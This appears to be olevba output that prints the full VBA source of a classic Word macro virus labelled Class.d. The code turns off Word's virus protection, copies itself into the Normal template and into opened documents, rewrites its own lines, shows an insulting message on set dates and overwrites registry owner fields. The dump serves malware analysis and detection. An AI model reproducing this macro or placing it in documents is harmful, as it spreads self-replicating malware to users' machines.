olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f5786dad72e8d2f42d9ef33b124ce2ef75caec00
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f5786dad72e8d2f42d9ef33b124ce2ef75caec00 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'EWC4/7/99 10:53:53 AMHP LaserJet III on LPT1:pokus
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Const REG_SZ As Long = 1
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Const HKEY_CURRENT_USER As Long = &H80000001
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Sub AutoOpen()
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
On Error GoTo out
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Options.VirusProtection = False
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Options.SaveNormalPrompt = False
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Options.ConfirmConversions = False
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If nt > 70 And ad > 0 Then GoTo out
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If nt < 70 Then
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End If
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
host.codemodule.AddFromFile ("c:\class.sys")
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
With host.codemodule
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    For x = 1 To 16
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    .deletelines 1
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    Next x
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End With
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If nt < 70 Then
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    With host.codemodule
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    .replaceline 1, "Sub AutoClose()"
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    .replaceline 91, "Sub ToolsMacro()"
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    For x = 70 To 81
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
        .deletelines 62
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    Next x
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    .replaceline 35, "    For x = 1 To 4"
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    End With
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End If
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If nt < 70 Then
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
u = RegCloseKey(k)
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End If
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
With host.codemodule
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    For x = 2 To 104 Step 2
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
    Next x
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End With
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
out:
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End Sub
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
Sub ViewVBCode()
'EWC4/7/99 10:53:54 AMHP LaserJet III on LPT1:pokus
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

